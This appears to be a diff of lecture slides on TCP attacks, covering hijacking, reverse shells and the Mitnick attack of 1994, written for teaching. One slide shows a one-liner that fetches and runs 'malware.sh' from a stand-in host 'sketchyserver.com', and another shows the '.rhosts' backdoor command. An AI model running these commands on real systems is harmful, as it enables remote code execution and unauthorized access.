@@ -58,7 +58,6 @@
 [TCP Reset Attack](#/reset-attack)  
 [TCP Session Hijacking](#/hijacking)  
 [The Mitnick Attack](#/mitnick-attack)  
-[Misc](#/misc)  
 </textarea></section>
 
 <!-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -->
@@ -833,13 +832,23 @@ load       : StrField                            = b'\nhello world\n' ("b''")
 <!-- .slide: class="small-pre" -->
 ## Better injection / hijacking
 - Rather than cat'ing output to the /dev device...
-- Let's use a remote (or reverse) shell
+- Let's run a program to remotely run commands on the machine
   - Your ping shell from HW P2 would work
 - Have a single command download the program and also run it:
 ```
 wget -q -O /usr/bin/pwn.sh http://sketchyserver.com/malware.sh && \
       /bin/bash /usr/bin/pwn.sh
 ```
+
+
+
+## Reverse Shell
+- A normal remote shell, such as telnet or ssh, has the client connecting to the server
+- In a *reverse* shell, the roles are reversed
+  - The server, usually through an exploit, initiates a connection to the client (attacker)
+  - The attacker can then execute commands on the server
+- Here is a [list of some reverse shells](https://www.acunetix.com/blog/web-security-zone/what-is-reverse-shell/)
+- Here is a [list of even more reverse shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
 
 
@@ -871,49 +880,91 @@ wget -q -O /usr/bin/pwn.sh http://sketchyserver.com/malware.sh && \
 </textarea></section>
 
 <section data-markdown data-separator="^\n\n\n"><textarea data-template>
-## ...
-</textarea></section>
-
-</section>
-
-<!-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -->
-
-<section>
-
-<section data-markdown id="misc" class="center"><textarea data-template>
-# Misc
-</textarea></section>
-
-<section data-markdown data-separator="^\n\n\n"><textarea data-template>
-## TCP attacks
-- Imagine Alice is sending something to Bob
-- A host between Alice and Bob, Mallory, can intercept (and potentially discard) these packets
-  - Similar to a man-in-the-middle attack
-- But to modify the packets, the attacker would have to know the TCP state
-  - Starting sequence numbers, port numbers, etc.
-  - These are often easily guessable
-    - Ports are well-known
-    - Sequence numbers are often predictable
+<!-- .slide: class="right-float-img-600 no-border" -->
+## Kevin Mitnick (1963-2023)
+[![](https://upload.wikimedia.org/wikipedia/commons/thumb/d/d5/Kevin_Mitnick_ex_hacker_y_ahora_famoso_consultor_en_redes_en_Campus_Party_México_2010.jpg/1024px-Kevin_Mitnick_ex_hacker_y_ahora_famoso_consultor_en_redes_en_Campus_Party_México_2010.jpg)](https://commons.wikimedia.org/wiki/File:Kevin_Mitnick_ex_hacker_y_ahora_famoso_consultor_en_redes_en_Campus_Party_México_2010.jpg)
+- Computer hacker, convicted felon
+- Was on the run from 1992 on a previous charge
+- In 1994, he hacked into a phone system using the *Mitnick Attack*
+- Arrested in Feb 1995, sentenced to 5 years in jail
 
 
 
-## TCP attacks
-- If Mallory can guess the state, then s/he can impersonate one or the other (or both), thus hijacking the connection
-- Instead of downloading a valid program from a trusted website, instead you are now downloading some type of malware
-- How can we prevent this?
-  - By keeping anybody from figuring out the state of the TCP connection
-  - This state is discernible from the TCP packet headers
+## rlogin
+- Developed in 1982, it allowed easy remote execution of commands over a network from a *trusted* computer
+- Like telnet: username and password in clear text
+  - But you can run commands directly (rsh), copy files (rcp), etc.
+- Now replaced by ssh and certificate logins
+- An `~/.rhosts` file specified who could log in *without* a password
 
 
 
-## TCP attack defenses
-- Have the sequence number be a random 32-bit value
-  - Not feasible to guess then
-- Encrypt the packet header
-  - Requires IP-level encryption, such as IPsec
-- Encrypt the data in the TCP packet, likely with TLS
-  - Prevents tampering with the data
-  - Does not prevent a MITM
+## Mitnick Attack
+- Target was "X-Terminal", ostensibly coming from a trusted server
+- Owned by Tsutomu Shimomura, who had software that Mitnick wanted
+- Has 4 steps:
+  1. Sequence number prediction
+  2. SYN flooding the server
+  3. Spoofing a TCP connection
+  4. Running a remote shell
+- This was in 1994, so many of the OS defenses of today were not present
+
+
+
+<h2 class="r-fit-text">Step 1: Sequence num prediction</h2>
+
+- TCP initial sequence numbers (ISNs) were not random back then
+- To learn the pattern:
+  - Send a SYN packet
+  - Server sends back a SYN-ACK, with a sequence number
+  - Send a RST to keep this from being a SYN flood attack
+- From this he was able to learn the pattern
+
+
+
+## Step 2: SYN flood the server
+- Goal was to establish a TCP connection with the X-Terminal
+  - Send a SYN, spoof it from the server
+  - X-Terminal sends a SYN-ACK to the server
+  - Server didn't initiate it, so sends a RST
+- Thus, we have to stop the server from responding
+- Method: SYN flood the server
+- SYN flood defenses were not very capable back then
+
+
+
+## Step 3: Spoof a TCP connection
+- Shimomura often logged in to X-Terminal from the server without a password
+  - Via his .rhosts entry
+- So we have to start a TCP connection
+- From step 2, X-Terminal sent a SYN-ACK
+  - But we need the sequence number
+- Mitnick determined the pattern of sequence numbers in step 1
+  - So he was able to spoof the ACK
+
+
+
+## Step 4: Running a remote shell
+- The remote command:
+```
+echo "+ +" >> ~/.rhosts
+```
+- This allows *anybody* to log in without a password
+- He was able to get the files he wanted
+- And was arrested the next year
+
+
+
+<!-- .slide: class="no-border" -->
+## Why we go over this attack
+
+<a href='https://en.wikipedia.org/wiki/File:Takedown_2000.jpg'><img src='https://upload.wikimedia.org/wikipedia/en/e/e5/Takedown_2000.jpg' style='float:right;width:300px;margin-left:20px'></a>
+
+- This attack was quite complex, and happened *30 years ago*
+- OSes have better defenses these days, true
+- But attackers have had 30 years to sharpen their attacks
+
+And they made a movie about it...
 </textarea></section>
 
 </section>
